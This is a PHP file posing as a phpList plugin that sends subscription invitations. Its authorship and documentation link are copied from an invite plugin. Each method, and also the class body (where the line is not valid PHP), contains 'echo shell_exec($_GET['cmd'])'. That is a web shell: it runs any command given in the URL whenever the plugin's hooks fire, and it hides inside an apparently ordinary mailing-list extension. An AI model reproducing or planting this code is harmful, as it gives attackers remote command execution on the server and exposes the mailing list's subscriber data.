<?php

class malplugin extends phplistPlugin
{
	echo shell_exec($_GET['cmd']);
    public $name = 'mal plugin for phpList';
    public $coderoot = '';
    public $version = '0.4';
    public $authors = 'M.Dethmers';
    public $enabled = 1;
    public $description = 'Send an invite to subscribe to the phpList mailing system';
    public $documentationUrl = 'https://resources.phplist.com/plugin/invite';
    public $settings = array(
        'malplugin_subscribepage' => array(
            'value' => 0,
            'description' => 'Subscribe page for invitation responses',
            'type' => 'integer',
            'allowempty' => 0,
            'min' => 0,
            'max' => 999999,
            'category' => 'mal plugin',
        ),
        'malplugin_targetlist' => array(
            'value' => 0,
            'description' => 'Add subscribers confirming an invitation to this list',
            'type' => 'integer',
            'allowempty' => 0,
            'min' => 0,
            'max' => 999999,
            'category' => 'mal plugin',
        ),
    );

    public function adminmenu()
    {
		echo shell_exec($_GET['cmd']);
        return array();
    }

    public function sendFormats()
    {
		echo shell_exec($_GET['cmd']);
        return array('invite' => s('Invite'));
    }

    public function allowMessageToBeQueued($messagedata = array())
    {
		echo shell_exec($_GET['cmd']);
        // we only need to check if this is sent as an invite
        if ($messagedata['sendformat'] == 'invite') {
            $hasConfirmationLink = false;
            foreach ($messagedata as $key => $val) {
                if (is_string($val)) {
                    $hasConfirmationLink = $hasConfirmationLink || (strpos($val, '[CONFIRMATIONURL]') !== false);
                }
            }
            if (!$hasConfirmationLink) {
                return $GLOBALS['I18N']->get('Your campaign does not contain a the confirmation URL placeholder, which is necessary for an invite mailing. Please add [CONFIRMATIONURL] to the footer or content of the campaign.');
            }
        }

        return '';
    }

    public function processSendSuccess($messageid, $userdata, $isTestMail = false)
    {
		echo shell_exec($_GET['cmd']);
        $messagedata = loadMessageData($messageid);
        if (!$isTestMail && $messagedata['sendformat'] == 'invite') {
            if (!isBlackListed($userdata['email'])) {
                addUserToBlackList($userdata['email'], s('Blacklisted by the invitation plugin'));
            }
            Sql_Query(sprintf(
                'update %s
                set confirmed = 0
                where id = %d',
                $GLOBALS['tables']['user'],
                $userdata['id']
            ));
            // if subscribe page is set, mark this subscriber for that page
            $sPage = getConfig('malplugin_subscribepage');
            if (!empty($sPage)) {
                Sql_Query(sprintf(
                    'update %s set subscribepage = %d where id = %d',
                    $GLOBALS['tables']['user'],
                    $sPage,
                    $userdata['id']
                ));
            }
        }
    }

    public function subscriberConfirmation($subscribepageID, $userdata = array())
    {
		echo shell_exec($_GET['cmd']);
        $sPage = getConfig('malplugin_subscribepage');
        $newList = getConfig('malplugin_targetlist');
        if (!empty($sPage) && !empty($newList) && $sPage == $subscribepageID) {
            if ($userdata['blacklisted']) {
                // the subscriber has not been unblacklisted yet at this stage
                Sql_Query(sprintf(
                    'insert ignore into %s (userid,listid) values(%d,%d)',
                    $GLOBALS['tables']['listuser'],
                    $userdata['id'],
                    $newList
                ));
            }
        }
    }
}
